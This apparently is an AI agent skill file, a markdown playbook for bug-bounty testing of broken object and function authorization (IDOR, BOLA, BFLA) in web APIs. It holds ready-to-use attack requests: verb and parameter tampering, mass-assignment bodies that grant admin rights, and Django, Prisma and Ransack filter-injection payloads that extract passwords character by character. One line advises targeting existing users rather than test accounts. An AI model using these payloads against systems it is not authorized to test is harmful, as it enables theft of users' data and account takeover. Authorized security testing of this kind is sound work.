---
name: idor-broken-object-authorization
description: >-
  IDOR and broken object authorization testing playbook. Use when requests expose object identifiers, tenant boundaries, writable fields, or missing object-level authorization checks.
---

# SKILL: IDOR / Broken Object Level Authorization — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: IDOR is the #1 bug bounty finding. This skill covers non-obvious IDOR surfaces, all attack vectors (not just URL params), A-B testing methodology, BOLA vs BFLA distinction, chaining IDOR to higher impact, and what testers repeatedly miss.

---

## 1. IDOR vs BOLA vs BFLA

| Term | Meaning | Impact |
|---|---|---|
| IDOR | Insecure Direct Object Reference | Read/modify other users' data |
| BOLA | Broken Object Level Authorization (OWASP API Top 10 A1) | Same as IDOR, API terminology |
| BFLA | Broken Function Level Authorization | Low-priv user accesses HIGH-PRIV functions (e.g., admin endpoints) |

**Key distinction**: 
- BOLA = accessing **object** you shouldn't own (data belonging to other users)
- BFLA = accessing **function** you shouldn't be authorized for (admin CRUD operations, bulk actions, user management)

---

## 2. WHERE TO FIND OBJECT IDs (ALL LOCATIONS)

Don't stop at URL path parameters — IDs appear in:

```
URL path:        GET /api/v1/users/1234/profile
URL query:       GET /orders?order_id=982
Request body:    {"userId": 1234, "action": "view"}
JSON fields:     {"resource": {"id": 5678, "type": "invoice"}}
Headers:         X-User-ID: 1234
                 X-Account-ID: 9999
Cookies:         user_id=1234; account=org_5678
GraphQL args:    query { user(id: "1234") { ... } }
Form fields:     <input name="documentId" value="5678">
WebSocket msgs:  {"event":"subscribe","channel_id":9999}
```

---

## 3. A-B TESTING METHODOLOGY

The most systematic IDOR test approach:

```
Step 1: Create two test accounts: UserA and UserB
Step 2: Perform all actions as UserA, capture all requests
        (profile edit, order view, password change, file access, etc.)
Step 3: Note every object ID created or accessed by UserA
Step 4: Authenticate as UserB
Step 5: Replay UserA's requests using UserB's session token
Step 6: If UserB can read/modify UserA's data → BOLA confirmed

Victim matters: for real bugs, target existing users, not test accounts.
Report evidence: show UserA owns the resource, UserB accessed it.
```

---

## 4. ID TYPE ITS IMPLICATIONS

| ID Pattern | Example | Notes |
|---|---|---|
| Sequential int | `id=1001` → `id=1002` | Easy prediction, high hit rate |
| UUID v4 | `550e8400-...` | Need to find UUID from other endpoints |
| UUID v1 | Clock-based UUID | Time-predictable! Extract timestamp/MAC |
| GUIDs from own data | See in responses | Collect all UUIDs from your own account data first |
| Hashed IDs | `md5(user_id)` | Try hashing sequential ints |
| Encoded IDs | base64(`{"id":1001}`) | Decode → modify → re-encode |
| Compound IDs | `/api/users/1/orders/5` | Both IDs may be independently verifiable |

---

## 5. HORIZONTAL vs VERTICAL PRIVILEGE ESCALATION

**Horizontal**: UserA accesses UserB's data (same privilege level)
```
GET /api/account/1234/statement     ← you are user 5678
```

**Vertical**: Low-priv user accesses admin-only functions
```
POST /api/admin/users/delete        ← normal user calling admin endpoint
GET /api/admin/all-users
PUT /api/users/1234/role {"role":"admin"}
```

**Combined**: Low-priv IDOR that grants privilege escalation
```
GET /api/v1/users/1/details → read admin user's auth token
```

---

## 6. HTTP METHOD ESCALATION

When `GET /resource/1234` is properly restricted, test ALL other verbs:

```http
GET    /api/v1/users/UserA_ID    ← might be blocked
POST   /api/v1/users/UserA_ID    ← different code path, might not check authz
PUT    /api/v1/users/UserA_ID    ← update another user's data
DELETE /api/v1/users/UserA_ID    ← delete another user's account
PATCH  /api/v1/users/UserA_ID    ← partial update (often missed in authz checks)
```

**Why this works**: Authorization logic is often implemented per-method, and developers forget edge cases.

---

## 7. PARAMETER POLLUTION & TYPE CONFUSION

When `id=1234` is validated, try:
```
id[]=1234&id[]=5678          ← array — app may use first or last
id=5678&id=1234              ← duplicate — app may prefer first or last
{"id": "1234"}               ← string vs int: might hit different code path
{"id": [1234]}               ← array in JSON
{"userId": 1234, "id": 5678} ← two ID fields — which is used for authz?
```

**JSON Type Confusion**:
```json
{"userId": "1234"}   vs   {"userId": 1234}
```
Some ORMs handle string vs integer differently in queries.

---

## 8. BFLA (FUNCTION LEVEL) ATTACKS

### Common BFLA Endpoints to Test

```http
# User management (admin-only in design):
GET /api/v1/admin/users
DELETE /api/v1/users/{any_user_id}
PUT /api/v1/users/{user_id}/role

# Bulk operations:
POST /api/v1/users/bulk-delete
GET /api/v1/export/all-data

# Billing/payment admin:
POST /api/v1/admin/subscription/modify
GET /api/v1/admin/payments/all

# Internal reporting:
GET /api/v1/reports/all-users-activity
```

### How to Find Hidden Admin Endpoints
1. Read JS bundles — admin routes often exposed in frontend code
2. Look at API docs (Swagger/OpenAPI) for "admin", "internal", "privileged" tags
3. Enumerate `/api/v1/admin/**`, `/api/v1/manage/**`, `/api/v1/internal/**`
4. Burp "Discover Content" on API base path
5. Compare regular user docs vs admin section docs if available

---

## 9. INDIRECT IDOR (REFERENCE CHAIN)

App checks permission on **object A** but doesn't check ownership of **referenced object B**:

**Example**:
```
UserA has permission to read their own messages.
GET /api/messages/1234 → checks: "does user own message 1234?" ✓

But: messages have attachments.
GET /api/attachments/5678 → doesn't check: "does attachment belong to message owned by user?"
```

Test: access attachments/sub-resources directly via their IDs without going through parent endpoint.

**GraphQL variant**: Inline querying related objects without separate authorization:
```graphql
query {
  myProfile {
    followers {
      privateEmail    ← accessing private field of OTHER users via relationship
    }
  }
}
```

---

## 10. MASS ASSIGNMENT → PRIVILEGE ESCALATION

When POST/PUT takes a JSON body, properties in the underlying model may be settable even if not in the official API docs:

```json
POST /api/v1/register
{
  "username": "attacker",
  "email": "a@evil.com",
  "password": "password",
  "role": "admin",          ← hidden field
  "isAdmin": true,          ← hidden field
  "verified": true,         ← skip email verification
  "creditBalance": 9999     ← give self credits
}
```

**How to find hidden fields**:
1. Intercept admin "create user" vs normal "register" — diff the fields
2. Read API documentation for all possible fields
3. Check source code if available (GitHub, JS bundles)
4. Fuzz with Burp: add common property names and check for `200` vs `400`

---

## 11. STATE MACHINE ABUSE (BUSINESS LOGIC IDOR)

When resources have a status/state:
```
order.status: pending → confirmed → shipped → delivered
```

Test: Can you skip states?
```
PUT /api/orders/1234 {"status": "delivered"}  ← from "pending"
PUT /api/orders/1234 {"status": "refunded"}   ← from "pending" (skip shipped)
```

Can you set another user's order status?
```
PUT /api/orders/UserA_order_id {"status": "cancelled"}  ← as UserB
```

---

## 12. QUICK IDOR CHECKLIST

```
□ Create 2 accounts (UserA + UserB)
□ Map all API calls that contain object IDs (Burp History export filter)
□ Test all HTTP verbs on each endpoint
□ Test ID in all locations: path, body, header, query, cookie
□ Try sequential IDs (−1, +1 from your own)
□ Try UUIDs/GUIDs collected from your own account data
□ Test sub-resources (attachments, comments, transactions)
□ Test admin endpoints directly (BFLA)
□ Test POST/PUT body for extra fields (mass assignment)
□ Compare JSON response field count vs documented fields (hidden fields)
□ Test state/status field modification
```

---

## 13. SYSTEMATIC IDOR TESTING — 8 CATEGORIES

| # | Category | Test Method |
|---|---|---|
| 1 | Direct ID reference | Change numeric/UUID ID in URL: `/api/users/123` → `/api/users/124` |
| 2 | Predictable UUID | If UUIDs are v1 (time-based), adjacent IDs are calculable |
| 3 | Batch/bulk operations | `/api/users/bulk?ids=123,456` — add other users' IDs |
| 4 | Export/download | Export endpoint leaks other users' data: `/export?user_id=*` |
| 5 | Linked object IDOR | Change `order.address_id` to another user's address |
| 6 | Resource replacement | Update own profile with another user's resource ID → overwrites |
| 7 | Write IDOR | PUT/PATCH/DELETE with other user's ID — modify/delete their data |
| 8 | Nested object | `/api/orgs/1/users/2` — change org ID to access other org's users |

### Testing Flow

```
1. Create two test accounts (A and B)
2. Perform all CRUD operations as A, capture all request IDs
3. Replay each request replacing A's IDs with B's IDs
4. Check: Can A read B's data? Modify? Delete?
5. Test with: numeric IDs, UUIDs, slugs, encoded values
6. Test across: URL path, query params, JSON body, headers
```

---

## 14. ORM FILTER CHAIN LEAKS

### Django ORM Filter Injection

```python
# Vulnerable: User.objects.filter(**request.data)
# Attacker sends: {"password__startswith": "a"}
# Django translates to: WHERE password LIKE 'a%'

# Character-by-character extraction:
POST /api/users/
{"username": "admin", "password__startswith": "a"}   → 200 (match)
{"username": "admin", "password__startswith": "b"}   → 404 (no match)
# Iterate through charset for each position

# Relational traversal:
{"author__user__password__startswith": "a"}
# Traverses: Author → User → password field

# On MySQL: ReDoS via regex
{"email__regex": "^(a+)+$"}  → CPU spike if match exists
```

### Prisma Filter Injection

```json
// Vulnerable: prisma.user.findMany({ where: req.body })
// Attacker sends nested include/select:
{
  "include": {
    "posts": {
      "include": {
        "author": {
          "select": {"password": true}
        }
      }
    }
  }
}
// Leaks password field through relation traversal
```

### Ransack (Ruby on Rails)

```
# Ransack allows search predicates via query params:
GET /users?q[password_cont]=admin
# Searches: WHERE password LIKE '%admin%'

# Character extraction:
GET /users?q[password_start]=a   → count results
GET /users?q[password_start]=ab  → narrow down
# Tool: plormber (automated Ransack extraction)
```
